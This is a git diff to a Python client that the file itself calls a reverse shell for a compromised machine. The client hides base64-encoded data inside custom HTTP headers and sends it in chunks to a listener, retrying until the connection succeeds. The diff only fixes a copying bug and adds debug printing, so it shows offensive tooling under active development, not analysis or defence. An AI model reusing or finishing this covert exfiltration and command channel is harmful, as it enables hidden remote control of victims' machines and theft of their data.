@@ -4,7 +4,7 @@ Executes on the compromised machine. A reverse shell that communicates with the 
 
 import requests
 from requests import Request, Response
-from copy import copy
+from copy import deepcopy
 import base64
 from math import ceil
 from time import sleep
@@ -75,7 +75,7 @@ def create_requests(data: str):
 
     # Check if there is no data to send
     if len(data) == 0:
-        requests.append(copy(default_request))
+        requests.append(deepcopy(default_request))
         # Return a single request with empty headers
         return requests
     
@@ -91,14 +91,13 @@ def create_requests(data: str):
     # Calculate how many requests to split the data into
     request_count = ceil(len(encoded_str) / CLIENT_MAX_MESSAGE_LENGTH)
     encoded_str_split = [encoded_str[i:i+CLIENT_MAX_MESSAGE_LENGTH] for i in range(0, len(encoded_str), CLIENT_MAX_MESSAGE_LENGTH)]
-
     for i in range(request_count):
-        if i == request_count - 1:
+        if i == (request_count - 1):
             request_flags |= RequestFlags.IS_END_OF_MESSAGE
-        new_request = copy(default_request)
+        new_request = deepcopy(default_request)
         new_request.headers[STEGO_HEADER_NAME] = encoded_str_split[i]
         add_request_flags(new_request, request_flags)
-        requests.append(new_request)
+        requests.append(new_request) # TODO FIX: why is each request identical???
     return requests
 
 def send_stego_data_to_listener(data: str):
@@ -114,6 +113,8 @@ def send_stego_data_to_listener(data: str):
     '''
     # Get the list of request header(s) to send
     requests_list = create_requests(data)
+    for request in requests_list:
+        print(request.headers)
     # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
     while (True):  
         try:
